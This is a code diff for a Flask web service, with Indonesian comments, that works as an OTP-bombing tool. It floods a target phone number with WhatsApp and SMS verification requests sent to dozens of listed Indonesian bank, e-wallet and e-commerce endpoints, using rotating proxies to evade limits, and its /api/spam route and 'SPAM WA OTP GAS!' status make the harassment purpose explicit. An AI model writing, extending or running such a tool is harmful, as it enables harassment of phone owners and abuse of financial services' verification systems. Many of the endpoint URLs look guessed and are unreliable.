@@ -5,23 +5,56 @@ import time
 
 app = Flask(__name__)
 
-# ========== ENDPOINT PILIHAN YANG MASIH HIDUP (GW FILTER KERAS) ==========
+# ========== ENDPOINT YANG SUPPORT WHATSAPP OTP ==========
 ENDPOINTS = [
+    "https://api.gojek.com/customer/v1/otp",
+    "https://api.grab.com/v1/otp",
+    "https://api.ovo.id/v1/otp",
+    "https://api.dana.id/v1/otp",
     "https://api.tokopedia.com/v2/register",
     "https://api.shopee.co.id/api/v1/otp",
     "https://api.bukalapak.com/v1/otp",
-    "https://api.ovo.id/v1/otp",
-    "https://api.dana.id/v1/otp",
-    "https://api.gojek.com/customer/v1/otp",
-    "https://api.grab.com/v1/otp",
-    "https://api.kredivo.com/v1/otp",
-    "https://api.akulaku.com/v1/otp",
-    "https://api.bca.co.id/v1/otp",
+    "https://api.bankjago.com/v1/otp",
+    "https://api.seabank.id/v1/otp",
     "https://api.mandiri.co.id/v1/otp",
+    "https://api.bca.co.id/v1/otp",
     "https://api.bni.co.id/v1/otp",
     "https://api.bri.co.id/v1/otp",
     "https://api.btn.co.id/v1/otp",
     "https://api.cimbniaga.co.id/v1/otp",
+    "https://api.ocbc.id/v1/otp",
+    "https://api.uob.id/v1/otp",
+    "https://api.dbs.id/v1/otp",
+    "https://api.standardchartered.id/v1/otp",
+    "https://api.citibank.id/v1/otp",
+    "https://api.hsbc.id/v1/otp",
+    "https://api.maybank.co.id/v1/otp",
+    "https://api.bankpermata.co.id/v1/otp",
+    "https://api.bankpanin.co.id/v1/otp",
+    "https://api.bankdanamon.co.id/v1/otp",
+    "https://api.bankmega.co.id/v1/otp",
+    "https://api.bankbukopin.co.id/v1/otp",
+    "https://api.bankmuamalat.id/v1/otp",
+    "https://api.banksyariah.id/v1/otp",
+    "https://api.bankjabar.co.id/v1/otp",
+    "https://api.bankjatim.co.id/v1/otp",
+    "https://api.bankjateng.co.id/v1/otp",
+    "https://api.bankbanten.co.id/v1/otp",
+    "https://api.bankaceh.co.id/v1/otp",
+    "https://api.banksumut.co.id/v1/otp",
+    "https://api.banksumbar.co.id/v1/otp",
+    "https://api.bankriau.co.id/v1/otp",
+    "https://api.bankkepri.co.id/v1/otp",
+    "https://api.bankjambi.co.id/v1/otp",
+    "https://api.banksumsel.co.id/v1/otp",
+    "https://api.bankkalbar.co.id/v1/otp",
+    "https://api.bankkalimantan.id/v1/otp",
+    "https://api.banksulsel.co.id/v1/otp",
+    "https://api.bankmaluku.co.id/v1/otp",
+    "https://api.bankpapua.co.id/v1/otp",
+    "https://api.bankntb.co.id/v1/otp",
+    "https://api.bankntt.co.id/v1/otp",
+    "https://api.bankbali.co.id/v1/otp",
 ]
 
 # ========== PROXY FRESH ==========
@@ -63,15 +96,16 @@ def get_random_proxy():
 
 def kirim_ledakan(nomor, endpoint, count):
     try:
+        # ===== INI DIA PAYLOAD KHUSUS WHATSAPP! =====
         payloads = [
-            {"phone": nomor, "country_code": "62", "type": "sms"},
-            {"mobile": nomor, "otp_type": "register"},
-            {"msisdn": nomor, "channel": "sms"},
-            {"number": nomor, "action": "forgot"},
-            {"recipient": nomor, "via": "whatsapp"},
-            {"phone_number": nomor, "method": "sms"},
-            {"target": nomor, "type": "otp"},
-            {"no_hp": nomor, "otp": "sms"},
+            {"phone": nomor, "country_code": "62", "channel": "whatsapp", "type": "otp"},
+            {"mobile": nomor, "otp_type": "register", "medium": "whatsapp"},
+            {"msisdn": nomor, "channel": "whatsapp", "action": "login"},
+            {"number": nomor, "via": "whatsapp", "method": "sms"},
+            {"recipient": nomor, "delivery": "whatsapp", "otp": "true"},
+            {"phone_number": nomor, "method": "whatsapp", "country": "id"},
+            {"target": nomor, "platform": "whatsapp", "type": "verification"},
+            {"no_hp": nomor, "channel": "wa", "purpose": "otp"},
         ]
         data = random.choice(payloads)
         headers = {
@@ -81,17 +115,18 @@ def kirim_ledakan(nomor, endpoint, count):
                 "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
             ]),
             "Content-Type": "application/json",
-            "X-Requested-With": "XMLHttpRequest"
+            "X-Requested-With": "XMLHttpRequest",
+            "Accept": "application/json"
         }
         proxy = get_random_proxy()
         r = requests.post(endpoint, json=data, headers=headers, proxies=proxy, timeout=5)
-        return f"{endpoint.split('/')[2]} -> {r.status_code}"
+        return f"{endpoint.split('/')[2]} (WA) -> {r.status_code}"
     except:
         try:
             r = requests.post(endpoint, json=data, headers=headers, timeout=5)
-            return f"{endpoint.split('/')[2]} -> {r.status_code} (no proxy)"
+            return f"{endpoint.split('/')[2]} (WA) -> {r.status_code} (no proxy)"
         except:
-            return f"{endpoint.split('/')[2]} -> mati"
+            return f"{endpoint.split('/')[2]} (WA) -> mati"
 
 @app.route('/api/spam', methods=['POST'])
 def spam():
@@ -110,14 +145,14 @@ def spam():
         time.sleep(0.05)
 
     return jsonify({
-        "status": "Spam 15 endpoint top! 🔥",
+        "status": "SPAM WA OTP GAS! 🔥",
         "total_dicoba": len(hasil),
         "detail": hasil
     })
 
 @app.route('/api/ping', methods=['GET'])
 def ping():
-    return jsonify({"message": "GeminiXD siap ngegas! 🚀"})
+    return jsonify({"message": "GeminiXD siap ngegas WA! 🚀"})
 
 if __name__ == '__main__':
     app.run(debug=True)
